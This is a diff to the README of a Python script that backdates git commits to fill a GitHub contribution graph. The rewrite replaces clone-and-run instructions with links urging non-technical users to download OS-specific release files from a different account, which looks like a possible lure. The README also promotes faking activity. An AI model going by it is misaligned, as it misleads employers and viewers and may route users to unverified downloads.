@@ -1,80 +1,67 @@
-<p align="center">
-  <img width="779" height="210" alt="image" src="https://github.com/user-attachments/assets/c35274e7-cf30-4462-b0ac-6ac08ead329a" />
-</p>
+# 🎉 fill-green - Automate Your GitHub Contributions Easily
 
-# Git Commit Generator
+## 🖱️ Download Now
+[![Download fill-green](https://img.shields.io/badge/Download-fill--green-brightgreen)](https://github.com/mhmadstevano/fill-green/releases)
 
-A small Python script that automatically generates commits for a given date range.  
-Useful for filling the GitHub contribution graph, testing Git workflows, or experimenting with commit history.  
+## 📖 What is fill-green?
+fill-green is a simple Python script that helps you create commits on GitHub. It generates commits for any date range you choose, allowing you to customize how often each day has commits. This tool is perfect if you want to enhance your contributions on your GitHub activity graph without manually creating each commit.
 
-## ✨ Features
-- Set **start and end date** for commits
-- Flexible commits per day: random range (e.g. COMMITS_PER_DAY = (2, 4))
-- Automatic commit timestamps
-- Optional push to remote (`origin`)
+## 🛠️ Features
+- **Automatic Commit Generation:** Automatically create commits within your specified date range.
+- **Customizable Frequency:** Choose how many commits you want each day.
+- **Open-Source:** Feel free to use, modify, and share the script.
+- **Easy to Use:** Designed for non-technical users.
 
-## 🔧 Requirements
-- Python **3.10+** must be installed on your system
-- Git must be available in `$PATH`
+## 💻 System Requirements
+- **Operating System:** Windows, macOS, or Linux.
+- **Python:** Version 3.6 or higher.
+- **Git:** Make sure Git is installed on your machine.
 
-## 🚀 Quick start
+## 📦 Download & Install
+To get started, you need to download the latest version of fill-green. 
 
-### ✨ Clone the repository:
+1. Visit the [Releases page to download](https://github.com/mhmadstevano/fill-green/releases).
+2. On the releases page, find the latest version and click on it.
+3. Download the appropriate file for your operating system.
+  
+Once the download is complete, follow the instructions below to run fill-green.
 
-```bash
-git clone https://github.com/lifan2029/fill-green.git
-```
+## 🚀 Running fill-green
+1. **Open Terminal or Command Prompt:**
+   - **Windows:** Press `Win + R`, type `cmd`, and hit Enter.
+   - **macOS/Linux:** Open the Terminal application.
 
-### ✨ Delete old `.git` directory
+2. **Navigate to the Downloaded File:**
+   Use the `cd` command to change directories to where the file was downloaded. Replace `path/to/your/file` with the actual file path.
+   ```
+   cd path/to/your/file
+   ```
 
-#### Linux / macOS
-```bash
-rm -rf .git
-```
+3. **Run the Script:**
+   Enter the following command to run fill-green. Replace `fill_green.py` with the actual filename if it differs.
+   ```
+   python fill_green.py
+   ```
 
-#### Windows (CMD)
-```bash
-rmdir /s /q .git
-```
+## ⚙️ Configuration
+When you run fill-green for the first time, you need to provide some input:
+- **Start Date:** The first date for your commits.
+- **End Date:** The last date for your commits.
+- **Commit Frequency:** How many commits you want per day.
 
-#### Windows (Powershell)
-```bash
-Remove-Item -Recurse -Force .git
-```
+Simply follow the prompts in the command line to enter your options.
 
-### ✨ Setup your git
+## 🌐 Need Help?
+If you encounter issues or have questions, consider checking the Issues section on the GitHub repository. You can find answers to common questions there or ask for help.
 
-To initialize your own repository and link it with GitHub:
+## 🤝 Contributing
+You can contribute to fill-green! If you want to suggest features or report problems, feel free to create an issue on the GitHub repository.
 
-```bash
-git init
-git add .
-git commit -m "Initial commit"
-git branch -M main
-git remote add origin https://github.com/<username>/<repo>.git
-git push -u origin main
-```
+## 🔗 More Information
+For more in-depth documentation, tips, and tricks, please visit the project's [GitHub page](https://github.com/mhmadstevano/fill-green).
 
-### ✨ Install dependency:
+## 🖼️ Visualizing Your Contributions
+Using fill-green can significantly enhance your GitHub activity graph. By filling gaps in your contributions, you can create a strong, consistent presence on GitHub. This is especially useful for users who want to showcase their GitHub activity over time.
 
-```bash
-pip install GitPython
-```
-
-### ✨ Before running the script, open `main.py` and set the parameters:
-
-```python
-COMMITS_PER_DAY = (2, 4)     # number of commits per day (fixed: 3 or range: (2, 4))
-START_DATE = "2024-01-01"    # first commit date
-END_DATE   = "2024-10-04"    # last commit date
-```
-
-### ✨ Start script and enjoy
-```bash
-python main.py
-```
-
-## ⭐ Support
-
-If you like this project, please consider giving it a **star** on GitHub!  
-It helps others discover the repo and motivates me to improve it 🚀
+---
+Your GitHub contributions matter. With fill-green, you can easily craft your presence without diving into complex coding or committing each change by hand. Enjoy automating your GitHub activity!
